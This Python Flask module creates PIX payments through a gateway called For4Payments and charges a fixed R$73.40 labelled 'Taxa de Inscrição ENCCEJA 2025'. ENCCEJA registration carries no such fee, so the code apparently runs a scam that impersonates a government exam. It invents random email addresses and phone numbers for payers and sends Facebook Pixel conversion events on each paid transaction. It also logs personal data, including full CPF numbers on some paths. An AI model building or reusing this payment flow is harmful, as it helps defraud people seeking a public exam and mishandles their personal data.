import os
import requests
from datetime import datetime
from flask import current_app
from typing import Dict, Any, Optional
import random
import string

class For4PaymentsAPI:
    API_URL = "https://app.for4payments.com.br/api/v1"

    def __init__(self, secret_key: str):
        self.secret_key = secret_key

    def _get_headers(self) -> Dict[str, str]:
        return {
            'Authorization': self.secret_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }

    def _generate_random_email(self, name: str) -> str:
        clean_name = ''.join(e.lower() for e in name if e.isalnum())
        random_num = ''.join(random.choices(string.digits, k=4))
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
        domain = random.choice(domains)
        return f"{clean_name}{random_num}@{domain}"

    def _generate_random_phone(self) -> str:
        ddd = str(random.randint(11, 99))
        number = ''.join(random.choices(string.digits, k=8))
        return f"{ddd}{number}"

    def create_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Create a PIX payment request"""
        # Registro detalhado da chave secreta (parcial)
        if not self.secret_key:
            current_app.logger.error("Token de autenticação não fornecido")
            raise ValueError("Token de autenticação não foi configurado")
        elif len(self.secret_key) < 10:
            current_app.logger.error(f"Token de autenticação muito curto ({len(self.secret_key)} caracteres)")
            raise ValueError("Token de autenticação inválido (muito curto)")
        else:
            current_app.logger.info(f"Utilizando token de autenticação: {self.secret_key[:3]}...{self.secret_key[-3:]} ({len(self.secret_key)} caracteres)")

        # Log dos dados recebidos para processamento
        safe_data = {k: v for k, v in data.items()}
        if 'cpf' in safe_data:
            safe_data['cpf'] = f"{safe_data['cpf'][:3]}...{safe_data['cpf'][-2:]}" if len(safe_data['cpf']) > 5 else "***"
        current_app.logger.info(f"Dados recebidos para pagamento: {safe_data}")

        # Validação dos campos obrigatórios
        required_fields = ['name', 'email', 'cpf', 'amount']
        missing_fields = []
        for field in required_fields:
            if field not in data or not data[field]:
                missing_fields.append(field)
        
        if missing_fields:
            current_app.logger.error(f"Campos obrigatórios ausentes: {missing_fields}")
            raise ValueError(f"Campos obrigatórios ausentes: {', '.join(missing_fields)}")

        try:
            # Validação e conversão do valor
            try:
                amount_in_cents = int(float(data['amount']) * 100)
                current_app.logger.info(f"Valor do pagamento: R$ {float(data['amount']):.2f} ({amount_in_cents} centavos)")
            except (ValueError, TypeError) as e:
                current_app.logger.error(f"Erro ao converter valor do pagamento: {str(e)}")
                raise ValueError(f"Valor de pagamento inválido: {data['amount']}")
                
            if amount_in_cents <= 0:
                current_app.logger.error(f"Valor do pagamento não positivo: {amount_in_cents}")
                raise ValueError("Valor do pagamento deve ser maior que zero")

            # Processamento do CPF
            cpf = ''.join(filter(str.isdigit, str(data['cpf'])))
            if len(cpf) != 11:
                current_app.logger.error(f"CPF com formato inválido: {cpf} (comprimento: {len(cpf)})")
                raise ValueError("CPF inválido - deve conter 11 dígitos")
            else:
                current_app.logger.info(f"CPF validado: {cpf[:3]}...{cpf[-2:]}")

            # Validação e geração de email se necessário
            email = data.get('email')
            if not email or '@' not in email:
                email = self._generate_random_email(data['name'])
                current_app.logger.info(f"Email gerado automaticamente: {email}")
            else:
                current_app.logger.info(f"Email fornecido: {email}")

            # Processamento do telefone
            phone = data.get('phone', '')
            if not phone or not isinstance(phone, str) or len(phone.strip()) < 10:
                phone = self._generate_random_phone()
                current_app.logger.info(f"Telefone gerado automaticamente: {phone}")
            else:
                # Remove any non-digit characters from the phone
                phone = ''.join(filter(str.isdigit, phone))
                current_app.logger.info(f"Telefone processado: {phone}")

            # Preparação dos dados para a API
            payment_data = {
                "name": data['name'],
                "email": email,
                "cpf": cpf,
                "phone": phone,
                "paymentMethod": "PIX",
                "amount": amount_in_cents,
                "items": [{
                    "title": "Taxa de Inscrição ENCCEJA 2025",
                    "quantity": 1,
                    "unitPrice": amount_in_cents,
                    "tangible": False
                }]
            }

            current_app.logger.info(f"Dados de pagamento formatados: {payment_data}")
            current_app.logger.info(f"Endpoint API: {self.API_URL}/transaction.purchase")
            current_app.logger.info("Enviando requisição para API For4Payments...")

            try:
                response = requests.post(
                    f"{self.API_URL}/transaction.purchase",
                    json=payment_data,
                    headers=self._get_headers(),
                    timeout=30
                )

                current_app.logger.info(f"Resposta recebida (Status: {response.status_code})")
                current_app.logger.debug(f"Resposta completa: {response.text}")

                if response.status_code == 200:
                    response_data = response.json()
                    current_app.logger.info(f"Resposta da API: {response_data}")

                    return {
                        'id': response_data.get('id') or response_data.get('transactionId'),
                        'pixCode': response_data.get('pixCode') or response_data.get('pix', {}).get('code'),
                        'pixQrCode': response_data.get('pixQrCode') or response_data.get('pix', {}).get('qrCode'),
                        'expiresAt': response_data.get('expiresAt') or response_data.get('expiration'),
                        'status': response_data.get('status', 'pending')
                    }
                elif response.status_code == 401:
                    current_app.logger.error("Erro de autenticação com a API For4Payments")
                    raise ValueError("Falha na autenticação com a API For4Payments. Verifique a chave de API.")
                else:
                    error_message = 'Erro ao processar pagamento'
                    try:
                        error_data = response.json()
                        if isinstance(error_data, dict):
                            error_message = error_data.get('message') or error_data.get('error') or '; '.join(error_data.get('errors', []))
                            current_app.logger.error(f"Erro da API For4Payments: {error_message}")
                    except Exception as e:
                        error_message = f'Erro ao processar pagamento (Status: {response.status_code})'
                        current_app.logger.error(f"Erro ao processar resposta da API: {str(e)}")
                    raise ValueError(error_message)

            except requests.exceptions.RequestException as e:
                current_app.logger.error(f"Erro de conexão com a API For4Payments: {str(e)}")
                raise ValueError("Erro de conexão com o serviço de pagamento. Tente novamente em alguns instantes.")

        except ValueError as e:
            current_app.logger.error(f"Erro de validação: {str(e)}")
            raise
        except Exception as e:
            current_app.logger.error(f"Erro inesperado ao processar pagamento: {str(e)}")
            raise ValueError("Erro interno ao processar pagamento. Por favor, tente novamente.")

    def check_payment_status(self, payment_id: str) -> Dict[str, Any]:
        """Check the status of a payment"""
        try:
            current_app.logger.info(f"[PROD] Verificando status do pagamento {payment_id}")
            response = requests.get(
                f"{self.API_URL}/transaction.getPayment",
                params={'id': payment_id},
                headers=self._get_headers(),
                timeout=30
            )

            current_app.logger.info(f"Status check response (Status: {response.status_code})")
            current_app.logger.debug(f"Status check response body: {response.text}")

            if response.status_code == 200:
                payment_data = response.json()
                current_app.logger.info(f"Payment data received: {payment_data}")

                # Map For4Payments status to our application status
                status_mapping = {
                    'PENDING': 'pending',
                    'PROCESSING': 'pending',
                    'APPROVED': 'completed',
                    'COMPLETED': 'completed',
                    'PAID': 'completed',
                    'EXPIRED': 'failed',
                    'FAILED': 'failed',
                    'CANCELED': 'cancelled',
                    'CANCELLED': 'cancelled'
                }

                current_status = payment_data.get('status', 'PENDING').upper()
                mapped_status = status_mapping.get(current_status, 'pending')

                current_app.logger.info(f"Payment {payment_id} status: {current_status} -> {mapped_status}")
                
                # Se o pagamento foi confirmado, registrar evento para o Facebook Pixel
                if mapped_status == 'completed':
                    current_app.logger.info(f"[FACEBOOK_PIXEL] Evento de conversão para pagamento {payment_id} - Pixel ID: 1418766538994503")

                return {
                    'status': mapped_status,
                    'original_status': current_status,
                    'pix_qr_code': payment_data.get('pixQrCode'),
                    'pix_code': payment_data.get('pixCode'),
                    'facebook_pixel_id': '1418766538994503' if mapped_status == 'completed' else None
                }
            elif response.status_code == 404:
                current_app.logger.warning(f"Payment {payment_id} not found")
                return {'status': 'pending', 'original_status': 'PENDING'}
            else:
                error_message = f"Failed to fetch payment status (Status: {response.status_code})"
                current_app.logger.error(error_message)
                return {'status': 'pending', 'original_status': 'PENDING'}

        except Exception as e:
            current_app.logger.error(f"Error checking payment status: {str(e)}")
            return {'status': 'pending', 'original_status': 'PENDING'}
            
    def create_encceja_payment(self, user_data: Dict[str, Any]) -> Dict[str, Any]:
        """Criar um pagamento PIX para a taxa do Encceja"""
        current_app.logger.info(f"Solicitação de pagamento Encceja recebida: {user_data}")
        
        # Validação dos dados obrigatórios
        if not user_data:
            current_app.logger.error("Dados de usuário vazios")
            raise ValueError("Nenhum dado de usuário fornecido")
            
        if not user_data.get('nome'):
            current_app.logger.error("Nome do usuário não fornecido")
            raise ValueError("Nome do usuário é obrigatório")
            
        if not user_data.get('cpf'):
            current_app.logger.error("CPF do usuário não fornecido")
            raise ValueError("CPF do usuário é obrigatório")
            
        # Valor fixo da taxa do Encceja
        amount = 73.40
        current_app.logger.info(f"Valor da taxa: R$ {amount:.2f}")
        
        # Sanitização e preparação dos dados
        try:
            # Formatar o CPF para remover caracteres não numéricos
            cpf_original = user_data.get('cpf', '')
            cpf = ''.join(filter(str.isdigit, str(cpf_original)))
            if len(cpf) != 11:
                current_app.logger.warning(f"CPF com formato inválido: {cpf_original} → {cpf} ({len(cpf)} dígitos)")
            else:
                current_app.logger.info(f"CPF formatado: {cpf[:3]}...{cpf[-2:]}")
                
            # Gerar um email aleatório baseado no nome do usuário
            nome = user_data.get('nome', '').strip()
            email = self._generate_random_email(nome)
            current_app.logger.info(f"Email gerado: {email}")
            
            # Limpar o telefone se fornecido, ou gerar um aleatório
            phone_original = user_data.get('telefone', '')
            phone_digits = ''.join(filter(str.isdigit, str(phone_original)))
            
            if not phone_digits or len(phone_digits) < 10:
                phone = self._generate_random_phone()
                current_app.logger.info(f"Telefone inválido '{phone_original}', gerado novo: {phone}")
            else:
                phone = phone_digits
                current_app.logger.info(f"Telefone formatado: {phone}")
                
            current_app.logger.info(f"Preparando pagamento para: {nome} (CPF: {cpf[:3]}...{cpf[-2:]})")
            
            # Formatar os dados para o pagamento
            payment_data = {
                'name': nome,
                'email': email,
                'cpf': cpf,
                'amount': amount,
                'phone': phone,
                'description': 'Taxa de inscrição ENCCEJA 2025'
            }
            
            current_app.logger.info("Chamando API de pagamento PIX")
            result = self.create_pix_payment(payment_data)
            current_app.logger.info(f"Pagamento criado com sucesso, ID: {result.get('id')}")
            return result
            
        except Exception as e:
            current_app.logger.error(f"Erro ao processar pagamento Encceja: {str(e)}")
            raise ValueError(f"Erro ao processar pagamento: {str(e)}")

def create_payment_api(secret_key: Optional[str] = None) -> For4PaymentsAPI:
    """Factory function to create For4PaymentsAPI instance"""
    if secret_key is None:
        secret_key = os.environ.get("FOR4PAYMENTS_SECRET_KEY")
        if not secret_key:
            raise ValueError("FOR4PAYMENTS_SECRET_KEY não configurada no ambiente")
    return For4PaymentsAPI(secret_key)